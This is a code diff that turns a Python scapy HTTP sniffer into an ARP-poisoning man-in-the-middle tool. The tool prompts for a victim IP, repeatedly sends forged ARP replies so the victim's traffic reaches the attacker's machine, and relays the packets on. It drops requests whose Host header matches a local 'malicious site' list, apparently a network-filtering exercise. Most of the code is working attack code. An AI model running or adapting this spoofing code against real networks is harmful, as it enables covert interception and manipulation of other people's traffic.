@@ -1,3 +1,4 @@
+#coding: utf-8
 import os
 import logging
 import binascii
@@ -5,66 +6,138 @@ import re
 import sys
 import threading
 import time
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)      # Delete scapy logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
 from scapy.all import *
 
-myMAC = ""
-gatewayMAC = ""
+myMAC = 0
+victimMAC = 0
+myIP = 0
+victimIP = 0
+gatewayIP = 0
+gatewayMAC = 0
+mal_site = ""
 
 def open_list():
 	f = open("mal_site.txt", "r")
-	mal_site = f.read().split('\n')
-	print mal_site
+	mal_site = f.read()
 	f.close()
+	return mal_site
 
 def http_parse(data):
-	str_method = ""
-	str_uri = ""
-	
-	h = re.search("(?P<method>(^GET|^POST|^PUT|^DELETE)) (?P<uri>.+) (?P<version>.+)", data)
-	if not h: return "Error"
+	global mal_site
+	str_url = ""
+	h = re.search("Host: (?P<url>.+)", data)
+	if h:
+		if h.group("url"): 
+			str_url = h.group("url")
+			if re.findall('http://'+str_url, mal_site):
+				return str_url
+	return ""
 
-	if h.group("method"): str_method = h.group("method")
-	if h.group("uri"): str_uri = h.group("uri")
+class arp_poison(threading.Thread):
 
-	return str_method,str_uri
-	
-
-def proc(packet):
-	p = packet[0]
-	layer = p.payload
-	while layer:
-		layerName = layer.name
-		if layerName == "Raw":
-			result = http_parse(layer.load)
-			if result != "Error":
-				print result[0] + " " + result[1]
-		layer = layer.payload
-
-
-class capture(threading.Thread):
 	def run(self):
-		global myMAC, gatewayMAC
+		global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
 		while(True):
-			sniff(prn=proc, filter="(ether src host " + myMAC + ") and (ether dst host " + gatewayMAC + ")", count=1)
+				# Malicious ARP packet send			
+			sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3)
+#			sendp(Ether(dst=gatewayMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=victimIP, pdst=gatewayIP, hwsrc=myMAC, hwdst=gatewayMAC), count=3)
+			time.sleep(1)
+
+def relay(packet):
+	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC, mal_site
+	if packet.haslayer(IP):
+		if packet.haslayer(TCP):
+			del packet[TCP].chksum
+			if packet.haslayer(Raw):
+				payload = packet[TCP].load
+				if payload:
+					url = http_parse(payload)
+					print url
+					if url != "":
+						if url in mal_site :
+							print "Mal_site detected! : " + str(url)
+							return
+		elif packet.haslayer(UDP):
+			del packet[UDP].chksum
+			del packet[UDP].len
+		del packet.chksum
+		del packet.len
+
+		if packet[Ether].src == victimMAC:
+			if packet.haslayer(IP):
+				packet[Ether].src = victimMAC
+				packet[IP].src = victimIP
+				frags=fragment(packet,fragsize=1024)
+				for frag in frags:
+					sendp(frag, verbose=False)
+
+class to_gateway(threading.Thread):
+	def run(self):
+		while(True):
+			sniff(prn=relay, store=0)
 
 def main():
-	global myMAC, gatewayMAC
-	myMAC = os.popen("ifconfig eth0 | awk '/HWaddr/ { print $5 }'").read().replace('\n','')	
-	arp_stat = os.popen("arp -a").read()
-	gatewayIP = os.popen("route | awk '/default/ { print $2 }'").read().replace('\n','')
+	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC, mal_site
+	victimIP = raw_input("[*] Please enter the victim's IP >> ")
+	ok = re.findall("([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", victimIP)		# VictimIP validation check
+	if not(ok):
+		print "Error occured! Invalid IP format."	
+		sys.exit(1)
+
+	gatewayIP = os.popen("route -n | awk '/0.0.0.0/ { print $2 }' | grep -v \"0.0.0.0\"").read().replace('\n','')	# GatewayIP parsing
+	myIP = os.popen("ifconfig eth0 | awk '/inet addr:/ { print $2 }'").read()[5:].replace('\n','')		# HostIP parsing
+	myMAC = os.popen("ifconfig eth0 | awk '/HWaddr/ { print $5 }'").read().replace('\n','')		# HostMAC parsing
+	broadcast = 'ff:ff:ff:ff:ff:ff'
+	broadcast2 = '00:00:00:00:00:00'
+	arp_stat = os.popen("arp -a").read()		# arp table read
+
+	victimMAC = ""
+	temp = ""
+	ok = re.findall("\("+str(victimIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)	# ARP table MAC address parsing
 	gatewayMAC = re.findall("\("+str(gatewayIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)
+	
 	if gatewayMAC:
 		gatewayMAC = gatewayMAC[0]
 	else:
-		print "Can't get gatewayMAC!"
-		sys.exit(0)
+		print "Can't get gatewayMAC."
+		sys.exit(1)
 
-		
-	open_list()
-	tCapture = capture()
-	tCapture.start()
-	tCapture.join()
+	if ok:
+		victimMAC = ok[0]	# If exist
 
-if __name__ == "__main__":
+	else:
+		try:
+			p = sr1(Ether(dst=broadcast, src=myMAC)/ARP(op=ARP.who_has, psrc=myIP, pdst=victimIP, hwsrc=myMAC, hwdst=broadcast2))		# Broadcast ARP packet to victimIP
+			temp = p[0].summary()		# get ARP response packet
+			ok = re.findall("ARP is at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2})", temp)	# victimMAC parsing
+			if ok:
+				victimMAC = ok[0]	# victimMAC allocation
+		except Exception as e:
+			print "Error occured! Can't load the victimMAC. : " + str(e)
+			sys.exit(1)
+
+	print "myMAC : " + str(myMAC) + "\t\tmyIP : " + str(myIP)
+	print "victimMAC : " + str(victimMAC) + "\t\tvictimIP : " + str(victimIP)
+	print "gatewayMAC : " + str(gatewayMAC) + "\t\tgatewayIP : " + str(gatewayIP)
+	
+	mal_site = open_list()
+	
+	tArp = arp_poison()
+	tGateway = to_gateway()
+#	tVictim = to_victim(myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC)
+
+	tArp.start()
+	time.sleep(1)
+	tGateway.start()
+#	tVictim.start()
+
+	tArp.join()
+	tGateway.join()
+#	tVictim.join()
+
+	while True:
+		time.sleep(1000)
+
+if __name__ == '__main__':
 	main()
